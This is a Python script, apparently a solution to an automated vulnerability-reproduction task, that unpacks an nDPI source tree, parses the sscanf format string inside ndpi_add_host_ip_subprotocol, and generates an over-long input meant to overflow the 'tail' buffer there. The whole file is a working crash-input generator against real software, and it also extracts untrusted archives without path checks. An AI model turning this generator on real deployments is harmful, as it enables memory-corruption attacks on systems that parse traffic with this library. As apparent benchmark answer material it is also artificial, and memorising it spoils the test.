import os
import tarfile
import tempfile
import re
import codecs


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = self._prepare_source(src_path)
        if root_dir is None:
            return b"A" * 56

        ndpi_file = self._find_ndpi_main(root_dir)
        if ndpi_file is None:
            return b"A" * 56

        try:
            with open(ndpi_file, "r", encoding="utf-8", errors="ignore") as f:
                src = f.read()
        except Exception:
            return b"A" * 56

        func_body = self._locate_function_body(src, "ndpi_add_host_ip_subprotocol")
        if not func_body:
            return b"A" * 56

        call_str = self._find_sscanf_call_with_tail(func_body)
        if not call_str:
            return b"A" * 56

        args = self._split_args_from_call(call_str)
        if len(args) < 3:
            return b"A" * 56

        fmt = self._extract_format_string(args[1])
        if not fmt:
            return b"A" * 56

        var_list = args[2:]

        tail_idx = self._find_tail_index(var_list)
        if tail_idx < 0:
            return b"A" * 56

        tokens = self._parse_format(fmt)
        if not tokens:
            return b"A" * 56

        self._mark_tail_in_tokens(tokens, len(var_list), tail_idx)

        poc_str = self._build_input_from_tokens(tokens)
        if not poc_str:
            poc_str = "A" * 56

        if not poc_str.endswith("\n"):
            poc_str += "\n"

        try:
            return poc_str.encode("ascii", errors="ignore")
        except Exception:
            return poc_str.encode("utf-8", errors="ignore")

    def _prepare_source(self, src_path: str) -> str | None:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = None
        try:
            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
            with tarfile.open(src_path, "r:*") as tar:
                tar.extractall(tmpdir)
            return tmpdir
        except Exception:
            if tmpdir and os.path.isdir(tmpdir):
                return tmpdir
            parent = os.path.dirname(src_path)
            if os.path.isdir(parent):
                return parent
            return None

    def _find_ndpi_main(self, root_dir: str) -> str | None:
        # Prefer ndpi_main.c if present
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if name == "ndpi_main.c":
                    return os.path.join(dirpath, name)
        # Fallback: any .c file containing the function name
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                if not name.endswith(".c"):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception:
                    continue
                if "ndpi_add_host_ip_subprotocol" in content:
                    return path
        return None

    def _locate_function_body(self, src: str, func_name: str) -> str | None:
        pattern = func_name + "("
        offset = 0
        n = len(src)
        while True:
            idx = src.find(pattern, offset)
            if idx == -1:
                return None
            if idx > 0 and (src[idx - 1].isalnum() or src[idx - 1] == "_"):
                offset = idx + len(pattern)
                continue
            j = idx
            while j < n and src[j] not in "{;":
                j += 1
            if j >= n:
                return None
            if src[j] == ";":
                offset = j + 1
                continue
            start = j
            depth = 0
            k = start
            while k < n:
                ch = src[k]
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        end = k
                        return src[start : end + 1]
                k += 1
            return None

    def _find_sscanf_call_with_tail(self, func_body: str) -> str | None:
        pos = 0
        n = len(func_body)
        while True:
            idx = func_body.find("sscanf", pos)
            if idx == -1:
                return None
            if idx > 0 and (func_body[idx - 1].isalnum() or func_body[idx - 1] == "_"):
                pos = idx + 6
                continue
            call = self._extract_full_call(func_body, idx)
            if call and "tail" in call:
                return call
            pos = idx + 6

    def _extract_full_call(self, code: str, func_pos: int) -> str | None:
        n = len(code)
        i = func_pos
        while i < n and code[i] != "(":
            i += 1
        if i >= n:
            return None
        start = func_pos
        depth = 0
        in_string = False
        string_char = ""
        in_char = False
        escaped = False
        in_sl_comment = False
        in_ml_comment = False
        j = i
        while j < n:
            ch = code[j]
            if in_sl_comment:
                if ch == "\n":
                    in_sl_comment = False
                j += 1
                continue
            if in_ml_comment:
                if ch == "*" and j + 1 < n and code[j + 1] == "/":
                    in_ml_comment = False
                    j += 2
                    continue
                j += 1
                continue
            if in_string:
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == string_char:
                    in_string = False
                j += 1
                continue
            if in_char:
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == "'":
                    in_char = False
                j += 1
                continue
            if ch == "/" and j + 1 < n:
                nxt = code[j + 1]
                if nxt == "/":
                    in_sl_comment = True
                    j += 2
                    continue
                elif nxt == "*":
                    in_ml_comment = True
                    j += 2
                    continue
            if ch == '"':
                in_string = True
                string_char = '"'
                j += 1
                continue
            if ch == "'":
                in_char = True
                j += 1
                continue
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    return code[start : j + 1]
            j += 1
        return None

    def _split_args_from_call(self, call_str: str) -> list[str]:
        paren_index = call_str.find("(")
        if paren_index == -1 or not call_str.endswith(")"):
            return []
        args_str = call_str[paren_index + 1 : -1]
        n = len(args_str)
        args = []
        cur = []
        depth = 0
        in_string = False
        string_char = ""
        in_char = False
        escaped = False
        in_sl_comment = False
        in_ml_comment = False
        i = 0
        while i < n:
            ch = args_str[i]
            if in_sl_comment:
                cur.append(ch)
                if ch == "\n":
                    in_sl_comment = False
                i += 1
                continue
            if in_ml_comment:
                cur.append(ch)
                if ch == "*" and i + 1 < n and args_str[i + 1] == "/":
                    in_ml_comment = False
                    cur.append("/")
                    i += 2
                    continue
                i += 1
                continue
            if in_string:
                cur.append(ch)
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == string_char:
                    in_string = False
                i += 1
                continue
            if in_char:
                cur.append(ch)
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == "'":
                    in_char = False
                i += 1
                continue
            if ch == "/" and i + 1 < n:
                nxt = args_str[i + 1]
                if nxt == "/":
                    in_sl_comment = True
                    cur.append(ch)
                    i += 2
                    continue
                elif nxt == "*":
                    in_ml_comment = True
                    cur.append(ch)
                    i += 2
                    continue
            if ch == '"':
                in_string = True
                string_char = '"'
                cur.append(ch)
                i += 1
                continue
            if ch == "'":
                in_char = True
                cur.append(ch)
                i += 1
                continue
            if ch == "(":
                depth += 1
                cur.append(ch)
                i += 1
                continue
            if ch == ")":
                if depth > 0:
                    depth -= 1
                cur.append(ch)
                i += 1
                continue
            if ch == "," and depth == 0:
                arg = "".join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
                i += 1
                continue
            cur.append(ch)
            i += 1
        last = "".join(cur).strip()
        if last:
            args.append(last)
        return args

    def _extract_format_string(self, fmt_arg: str) -> str | None:
        # collect all string literals in the format argument and concatenate
        matches = re.findall(r'"([^"\\]*(?:\\.[^"\\]*)*)"', fmt_arg)
        if not matches:
            return None
        parts = []
        for raw in matches:
            try:
                part = codecs.decode(raw, "unicode_escape")
            except Exception:
                part = raw
            parts.append(part)
        return "".join(parts)

    def _find_tail_index(self, var_list: list[str]) -> int:
        pattern = re.compile(r"\btail\b")
        for i, arg in enumerate(var_list):
            if pattern.search(arg):
                return i
        return -1

    def _parse_format(self, fmt: str):
        tokens = []
        i = 0
        n = len(fmt)
        while i < n:
            if fmt[i] != "%":
                j = i
                while j < n and fmt[j] != "%":
                    j += 1
                lit = fmt[i:j]
                if lit:
                    tokens.append(("lit", lit))
                i = j
            else:
                if i + 1 < n and fmt[i + 1] == "%":
                    tokens.append(("lit", "%"))
                    i += 2
                    continue
                j = i + 1
                assign = True
                width = None
                length_mod = ""
                scan_set_pattern = None
                if j < n and fmt[j] == "*":
                    assign = False
                    j += 1
                width_start = j
                while j < n and fmt[j].isdigit():
                    j += 1
                if j > width_start:
                    try:
                        width = int(fmt[width_start:j])
                    except Exception:
                        width = None
                if j < n and fmt[j] in "hljztL":
                    length_mod += fmt[j]
                    j += 1
                    if j < n:
                        combo = length_mod + fmt[j]
                        if combo in ("hh", "ll"):
                            length_mod = combo
                            j += 1
                if j >= n:
                    break
                conv = fmt[j]
                j += 1
                if conv == "[":
                    start = j
                    if j < n and fmt[j] == "^":
                        j += 1
                    if j < n and fmt[j] == "]":
                        j += 1
                    while j < n and fmt[j] != "]":
                        j += 1
                    scan_set_pattern = fmt[start:j]
                    if j < n and fmt[j] == "]":
                        j += 1
                tokens.append(
                    (
                        "spec",
                        {
                            "conv": conv,
                            "assign": assign,
                            "width": width,
                            "length": length_mod,
                            "scan_set": scan_set_pattern,
                            "is_tail": False,
                        },
                    )
                )
                i = j
        return tokens

    def _mark_tail_in_tokens(self, tokens, var_count: int, tail_idx: int):
        var_idx = 0
        for kind, data in tokens:
            if kind != "spec":
                continue
            conv = data["conv"]
            if data["assign"] and conv != "n":
                if var_idx < var_count and var_idx == tail_idx:
                    data["is_tail"] = True
                var_idx += 1

    def _char_in_scanlist(self, ch: str, pattern: str) -> bool:
        if not pattern:
            return True
        negate = pattern[0] == "^"
        i = 1 if negate else 0
        n = len(pattern)
        inside = False
        while i < n:
            if i + 2 < n and pattern[i + 1] == "-" and pattern[i + 2] != "]":
                start = pattern[i]
                end = pattern[i + 2]
                if start <= ch <= end:
                    inside = True
                i += 3
            else:
                if ch == pattern[i]:
                    inside = True
                i += 1
        return not inside if negate else inside

    def _choose_char_for_scan_set(self, pattern: str) -> str:
        if not pattern:
            return "A"
        candidates = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        for ch in candidates:
            try:
                if self._char_in_scanlist(ch, pattern):
                    return ch
            except Exception:
                continue
        return "A"

    def _build_input_from_tokens(self, tokens) -> str:
        parts = []
        for kind, data in tokens:
            if kind == "lit":
                parts.append(data)
            else:
                conv = data["conv"]
                width = data["width"]
                is_tail = data.get("is_tail", False)
                token_str = ""
                if conv == "n":
                    token_str = ""
                elif conv in "diouxX":
                    token_str = "1"
                elif conv in "fFeEgGaA":
                    token_str = "1.0"
                elif conv == "c":
                    l = width if width is not None else 1
                    if l > 128:
                        l = 128
                    token_str = "C" * l
                elif conv == "s":
                    base_char = "T" if is_tail else "S"
                    if width is not None and width > 0:
                        l = width
                    else:
                        l = 128
                    if l > 4096:
                        l = 4096
                    token_str = base_char * l
                elif conv == "[":
                    ch = self._choose_char_for_scan_set(data.get("scan_set") or "")
                    if width is not None and width > 0:
                        l = width
                    else:
                        l = 8
                    if l > 512:
                        l = 512
                    token_str = ch * l
                elif conv == "p":
                    token_str = "0x1"
                else:
                    token_str = "Z"
                parts.append(token_str)
        return "".join(parts)